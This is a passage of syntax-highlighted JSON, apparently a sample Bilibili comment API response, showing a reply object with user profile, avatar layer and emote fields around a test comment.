class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reply_control&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;up_like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;time_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3天前发布&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;translation_switch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;has_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rule&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dynamic_id_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;note_cvid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;track_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270926105521</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">455215669</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754901502</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270926105521&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Aidemofashi_&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;男&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aidemofashi_爱的魔法尸\nemail:zhonghuaiyu2019@163.com&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fans_detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_contractor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;contract_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nft_interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar_item&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;container_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fallback_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;layer_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;AVATAR_LAYER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;is_critical&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;layer_mask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;mask_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;draw&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;draw_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;fill_mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;color_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                        <span class="hljs-attr">&quot;day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                            <span class="hljs-attr">&quot;argb&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FF000000&quot;</span><br>                                                        <span class="hljs-punctuation">&#125;</span><br>                                                    <span class="hljs-punctuation">&#125;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;res_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;res_image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;image_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;remote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;bfs_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;widget-layer-avatar&quot;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_critical_group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;datatest[星星眼]&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;members&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;emote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;[星星眼]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1956</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;package_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;[星星眼]&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/emote/63c9d1a31c0da745b61cdb35e0ecb28635675db2.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;meta&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;suggest&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                    <span class="hljs-string">&quot;&quot;</span><br>                                <span class="hljs-punctuation">]</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;mtime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1668688325</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;jump_title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;星星眼&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;assist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;up_action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reply&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;invisible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reply_control&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;time_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3天前发布&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;translation_switch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;has_folded&quot;</span><span 